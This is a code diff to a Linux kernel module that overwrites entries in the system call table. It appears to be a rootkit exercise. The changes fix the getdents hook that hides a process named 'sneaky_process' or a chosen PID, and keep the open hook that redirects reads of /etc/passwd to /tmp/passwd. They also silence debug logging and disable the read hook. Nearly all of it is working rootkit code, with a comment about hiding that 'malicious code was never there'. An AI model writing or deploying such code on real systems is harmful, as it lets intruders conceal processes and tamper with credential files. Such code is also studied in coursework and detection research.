@@ -17,7 +17,7 @@ struct linux_dirent {
 };
 
 MODULE_LICENSE("GPL");
-char * sneaky_pid;
+static char * sneaky_pid = "";
 module_param(sneaky_pid, charp, 0);
 MODULE_PARM_DESC(pid, "sneaky_process 's pid");
 
@@ -51,9 +51,9 @@ asmlinkage int (*original_call)(const char * pathname, int flags);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
-  printk(KERN_INFO "getting into sneaky_sys_open\n");
+  //printk(KERN_INFO "getting into sneaky_sys_open\n");
   if (strcmp(pathname, "/etc/passwd") == 0) {
-    printk(KERN_INFO "find /etc/passwd");
+    //printk(KERN_INFO "find /etc/passwd");
     copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
   }
   return original_call(pathname, flags);
@@ -69,7 +69,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
                                    unsigned int count) {
   struct linux_dirent * d;
   int nread, bpos;
-  printk(KERN_INFO "getting into sneaky_sys_getdents\n");
+  //  printk(KERN_INFO "getting into sneaky_sys_getdents\n");
 
   nread = original_getdents(fd, dirp, count);
   if (nread == -1) {
@@ -80,11 +80,11 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd,
   }
 
   for (bpos = 0; bpos < nread;) {
-    d = (struct linux_dirent *)(dirp + bpos);
+    d = (struct linux_dirent *)((char*)dirp + bpos);
     if ((strcmp(d->d_name, "sneaky_process") == 0) ||
         (strcmp(d->d_name, sneaky_pid) == 0)) {
-      printk(KERN_INFO "find sneaky_process of sneaky_pid");
-      memcpy(dirp + bpos, dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
+      printk(KERN_INFO "find sneaky_process or sneaky_pid");
+      memcpy((char*)dirp + bpos, (char*)dirp + bpos+ d->d_reclen, nread - (bpos + d->d_reclen));
       nread -= d->d_reclen;
     }
     else {
@@ -100,7 +100,7 @@ asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
   ssize_t nread;
   char *line_start, *line_end;
-  printk(KERN_INFO "getting into sneaky_sys_read\n");
+  //printk(KERN_INFO "getting into sneaky_sys_read\n");
 
   line_start = NULL;
   line_end = NULL;
@@ -149,8 +149,8 @@ static int initialize_sneaky_module(void) {
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   original_getdents = (void *)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
-  original_read = (void *)*(sys_call_table + __NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  //original_read = (void *)*(sys_call_table + __NR_read);
+  // *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -178,7 +178,7 @@ static void exit_sneaky_module(void) {
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  //  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
